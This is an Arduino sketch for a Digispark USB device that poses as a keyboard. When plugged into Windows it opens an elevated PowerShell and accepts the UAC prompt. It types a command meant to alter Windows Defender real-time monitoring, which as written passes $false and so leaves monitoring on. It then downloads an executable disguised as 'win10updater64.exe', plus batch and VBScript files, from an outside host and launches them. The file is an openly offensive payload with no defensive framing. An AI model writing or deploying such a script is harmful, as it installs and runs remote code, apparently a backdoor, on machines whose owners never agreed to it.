#define kbd_tr_tr
#define KEY_TAB 43
#include "DigiKeyboard.h"

void setup() {
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_Y);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_Y);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_TAB);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_TAB);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $false");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(100);
DigiKeyboard.print("Start-BitsTransfer https://www.emrecaglaryildiz.com.tr/test/nc/win10updater64.exe win10updater64.exe");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("Start-BitsTransfer https://www.emrecaglaryildiz.com.tr/test/nc/startupdate.bat startupdate.bat");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.print("Start-BitsTransfer https://www.emrecaglaryildiz.com.tr/test/nc/start.vbs start.vbs");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.print("exit");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(250);
DigiKeyboard.print("start.vbs");
DigiKeyboard.delay(250);
DigiKeyboard.sendKeyStroke(KEY_ENTER);

for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
